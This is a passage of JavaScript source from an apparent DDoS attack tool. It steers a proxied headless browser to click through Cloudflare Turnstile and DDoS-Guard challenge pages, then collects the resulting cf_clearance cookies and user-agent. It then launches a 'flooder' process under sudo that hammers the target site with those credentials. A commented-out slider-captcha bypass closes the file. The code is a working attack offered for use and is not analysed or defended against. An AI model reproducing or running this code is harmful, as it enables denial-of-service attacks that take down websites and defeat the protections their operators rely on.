                                        if (result && result.result && result.result.subtype !== 'error') {
                                            const rect = JSON.parse(result.result.value);
                                            if (rect && rect.x) {
                                                const x = rect.x + 30;
                                                const y = rect.y + rect.height / 2;
                                                await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x, y: y }, sessionId);
                                                await client.send("Input.dispatchMouseEvent", { type: "mousePressed", x: x, y: y, button: "left", clickCount: 1 }, sessionId);
                                                await client.send("Input.dispatchMouseEvent", { type: "mouseReleased", x: x, y: y, button: "left", clickCount: 1 }, sessionId);
                                                // log(1, `(Clicked Captcha) FRAMEID=${frame.id}, COORDINATES=(${x}, ${y})`);
                                            }
                                        } else if (result.result.subtype === 'error' && result.result.description.includes("Cannot read properties of null") && _turnstile) {
                                            if (!solved) {
                                                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Cloudflare Captcha')}: ${colors.green('Solved')}`);
                                                solved = true;
                                            }
                                        }
                                    } catch (err) {
                                        // console.log(`Error in frame ${frame.id}:`, err);
                                    }
                                }, 1000);
                            }

                            await sleep(1000);
                            if (!solving === true) {
                                resolve();
                            }
                        });

                        let protections = [
                            'just a moment...',
                            'security check',
                            'ddos-guard'
                        ]

                        await new Promise(async (resolve) => {
                            while (titles.length === 0 || protections.filter(a => titles[titles.length - 1].toLowerCase().indexOf(a) != -1).length > 0 || solved === false) {
                                await timers.setTimeout(100, null, { ref: false })
                            }

                            await title(sessionId);
                            resolve(null)
                        })

                        if (!request || !response) {
                            log(1, `${colors.magenta(proxy)} Error: ${colors.red('Session Failed')}`)
                            await browser.disconnect();
                            return main();
                        }

                        const url = new URL(target)
                        var cookies;
                        var uaString;

                        await new Promise((resolve, reject) => {
                            var error_count = 0;
                            var try_count = 0;
                            const cookie_interval = setInterval(async () => {
                                await client.send('Network.getCookies', { urls: [`${url.protocol}//${url.host}`] }, sessionId).then(async (cc) => {
                                    try_count += 1;
                                    uaString = request['user-agent'] || request['User-Agent']
                                    cookies = cc.cookies.map(x => [parse_cookie(x)]);
                                    cookies = cookies.join('; ');
                                    if (cloudflare && cookies.includes('cf_clearance')) {
                                        clearInterval(cookie_interval);
                                        resolve();
                                    } else if (cookies.includes('cf_chl_rc') && !cookies.include('cf_clearance')) {
                                        await sleep(1000);
                                    } else if (!solving && cookies) {
                                        clearInterval(cookie_interval);
                                        resolve();
                                    } else if (try_count >= 5) {
                                        clearInterval(cookie_interval);
                                        resolve();
                                    }
                                }).catch((err) => {
                                    error_count += 1;
                                    if (error_count >= 5) {
                                        reject();
                                    } else if (try_count >= 5) {
                                        clearInterval(cookie_interval);
                                        resolve();
                                    }
                                });
                            }, 1000).unref()
                        })
                        log(1, `(${colors.magenta(proxy)}) ${colors.bold('Cookies')}: ${colors.green(cookies)}`);
                        const modproxy = proxy.replace(/\r/g, '');
                        await browser.close();
                        await browser.disconnect();
                        flooder(modproxy, uaString, cookies);
                    }
                    attachTarget();
                }
            });

            let timeout;

            browser.on('error', (err) => {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: ${colors.bold.red(err.message)}`);
            })

            browser.on('disconnected', async () => {
                if (!browser?.isConnected()) {
                    log(1, `(${colors.magenta(proxy)}) ${colors.bold.yellow('Browser Disconnected')}`);
                    await browser.close();
                    clearTimeout(timeout);
                    resolve();
                }
            });

            var TIMEOUT = 60000;
            const timeout_duration = enabled('timeout');
            if (timeout_duration && !isNaN(timeout_duration)) {
                TIMEOUT = timeout_duration;
            }

            timeout = setTimeout(async () => {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: ${colors.bold.red('Timed Out')}`);
                await browser.close();
                main()
            }, TIMEOUT);
        });

        function flooder(proxy, uaString, cookies) {
            log(2, `(${colors.magenta(proxy)}) ${colors.bold('Spawning Flooder')}`);
            var THREADS = 1;
            const flooder_threads = enabled('threads');
            if (flooder_threads && !isNaN(flooder_threads)) {
                THREADS = flooder_threads;
            }

            if (cookies.includes('cf_clearance') && rate > 90) {
                rate = 90;
            }


            const args = [
                "./flooder",
                target,
                duration,
                rate,
                THREADS,
                proxyfile,
                "--proxy",
                proxy, //proxyfile
                "--agent",
                `${uaString}`,
                "--cookie",
                `${cookies}`,
            ]

            const flooder_options = ['ratelimit', 'randrate', 'close', 'ram', 'streams', 'delay'];

            for (const option of flooder_options) {
                var optionValue = enabled(option);
                // console.log("option:", option, "optionValue:", optionValue);
                if (optionValue !== undefined && !optionValue) {
                    args.push(`--${option}`)
                    args.push(optionValue)
                }
            }

            // console.log(`./flooder ${target} ${duration} ${rate} ${THREADS} ${proxyfile} --proxy ${proxy} --agent '${uaString}' --cookie '${cookies}' ${args.join(' ')}`);

            if (enabled('debug')) {
                args.push("--debug");
                args.push("true");
            } else {
                args.push("--debug");
                args.push("false");
            }

            const flooder_process = spawn('sudo', args, {
                stdio: 'pipe'
            })
            flooders.push(flooder_process);
            flooder_process.stdout.on('data', (data) => {
                const output = data.toString().split('\n').filter(line => line.trim() !== '').join('\n');
                if (output.includes('Restart Browser')) {
                    log(2, `(${colors.magenta(proxy)}) ${'Restarting Browser...'.bold}`);
                    flooder_process.kill();
                    return main();
                }
                if (enabled('debug')) {
                    // log(2, output);
                    console.log(output);
                }
            });

            flooder_process.stderr.on('data', (data) => {
                console.log("error:", data.toString('utf8'));
            })

            flooder_process.on('error', (err) => {
                console.log("flooder error:", err);
            })

            flooder_process.on('close', (code) => {
                console.log("flooder close, code:", code);
            })

        }
        main()
    }
}

/*

    const slider = await page.waitForSelector('#slider');
    const sliderContainer = await page.$('#sliderContainer');
    elemen container
    const containerBox = await sliderContainer.boundingBox();

    await page.mouse.move(containerBox.x + 10, containerBox.y + containerBox.height / 2);
    await page.mouse.down();
    await page.mouse.move(containerBox.x + containerBox.width - 20, containerBox.y + containerBox.height / 2, { steps: 20 });
    await page.mouse.up();

*/
